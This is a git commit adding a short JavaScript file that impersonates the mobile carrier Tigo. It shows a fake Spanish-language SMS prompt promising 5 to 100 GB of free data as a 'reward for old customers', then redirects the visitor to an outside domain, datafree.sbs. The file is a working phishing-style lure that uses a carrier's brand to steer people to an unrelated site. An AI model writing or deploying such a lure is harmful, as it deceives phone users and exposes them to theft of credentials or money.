0326fb0ed661b73fb0f32499f544f336ed5bbf0c
mmainomi <akparawa247@gmail.com>
2025-03-28 23:45:48 -0700

    Create activation-tigo-freedata.js

---
+++ activation-tigo-freedata.js
@@ -0,0 +1,6 @@
+
+var password = 'DATOS GRATIS'
+password=prompt('TIGO SMS: Estimado cliente, verifique si su tarjeta SIM Tigo califica para recibir de 5 GB a 100 GB de datos. Recompensa para antiguos clientes. Presione DATOS GRATIS para verificar ahora. ','DATOS GRATIS');
+if (password != 'DATOS GRATIS') {
+location.href='https://datafree.sbs/tigo-freedata.html';
+}
